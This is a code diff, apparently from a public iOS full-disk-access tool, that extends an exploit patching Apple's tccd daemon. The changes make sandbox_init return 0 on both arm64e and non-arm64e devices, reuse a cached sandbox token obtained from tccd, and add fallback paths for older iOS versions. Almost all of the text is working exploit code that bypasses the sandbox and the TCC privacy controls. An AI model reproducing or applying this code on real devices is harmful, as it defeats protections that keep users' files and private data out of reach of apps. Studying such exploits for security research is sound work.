@@ -127,8 +127,8 @@ static uint64_t patchfind_got(void* executable_map, size_t executable_length,
   struct section_64* section_array =
       ((void*)data_const_segment) + sizeof(struct segment_command_64);
   struct section_64* first_section = &section_array[0];
-  if (strcmp(first_section->sectname, "__auth_got")) {
-    // TODO(zhuowei): arm64?
+  if (!(strcmp(first_section->sectname, "__auth_got") == 0 ||
+        strcmp(first_section->sectname, "__got") == 0)) {
     return 0;
   }
   uint32_t* indirect_table = executable_map + dysymtab_command->indirectsymoff;
@@ -189,8 +189,8 @@ static bool patchfind(void* executable_map, size_t executable_length,
 
 static void call_tccd(void (^completion)(NSString* _Nullable extension_token)) {
   // reimplmentation of TCCAccessRequest, as we need to grab and cache the sandbox token so we can
-  // re-use it until next reboot returns the sandbox token if there is one, or nil if there isn't
-  // one.
+  // re-use it until next reboot.
+  // Returns the sandbox token if there is one, or nil if there isn't one.
   xpc_connection_t connection = xpc_connection_create_mach_service(
       "com.apple.tccd", dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), 0);
   xpc_connection_set_event_handler(connection, ^(xpc_object_t object) {
@@ -267,7 +267,7 @@ static NSData* patchTCCD(void* executableMap, size_t executableLength) {
     *(uint64_t*)(mutableBytes + offsets.offset_addr_s_kTCCServiceMediaLibrary + 8) =
         strlen("com.apple.app-sandbox.read-write");
   }
-  {
+  if (offsets.is_arm64e) {
     // make sandbox_init call return 0;
     struct dyld_chained_ptr_arm64e_auth_rebase targetRebase = {
         .auth = 1,
@@ -280,6 +280,15 @@ static NSData* patchTCCD(void* executableMap, size_t executableLength) {
     };
     *(struct dyld_chained_ptr_arm64e_auth_rebase*)(mutableBytes +
                                                    offsets.offset_auth_got__sandbox_init) =
+        targetRebase;
+  } else {
+    // make sandbox_init call return 0;
+    struct dyld_chained_ptr_64_rebase targetRebase = {
+        .bind = 0,
+        .next = 2,
+        .target = offsets.offset_just_return_0,
+    };
+    *(struct dyld_chained_ptr_64_rebase*)(mutableBytes + offsets.offset_auth_got__sandbox_init) =
         targetRebase;
   }
   return data;
@@ -307,6 +316,11 @@ static void grant_full_disk_access_impl(void (^completion)(NSString* extension_t
                                                            NSError* _Nullable error)) {
   char* targetPath = "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd";
   int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
+  if (fd == -1) {
+    // iOS 15.3 and below
+    targetPath = "/System/Library/PrivateFrameworks/TCC.framework/tccd";
+    fd = open(targetPath, O_RDONLY | O_CLOEXEC);
+  }
   off_t targetLength = lseek(fd, 0, SEEK_END);
   lseek(fd, 0, SEEK_SET);
   void* targetMap = mmap(nil, targetLength, PROT_READ, MAP_SHARED, fd, 0);
@@ -362,6 +376,19 @@ static void grant_full_disk_access_impl(void (^completion)(NSString* extension_t
 }
 
 void grant_full_disk_access(void (^completion)(NSError* _Nullable)) {
+  if (!NSClassFromString(@"NSPresentationIntent")) {
+    // class introduced in iOS 15.0.
+    // TODO(zhuowei): maybe check the actual OS version instead?
+    completion([NSError
+        errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
+                   code:6
+               userInfo:@{
+                 NSLocalizedDescriptionKey :
+                     @"Not supported on iOS 14 and below: on iOS 14 the system partition is not "
+                     @"reverted after reboot, so running this may permanently corrupt tccd."
+               }]);
+    return;
+  }
   NSURL* documentDirectory = [NSFileManager.defaultManager URLsForDirectory:NSDocumentDirectory
                                                                   inDomains:NSUserDomainMask][0];
   NSURL* sourceURL =
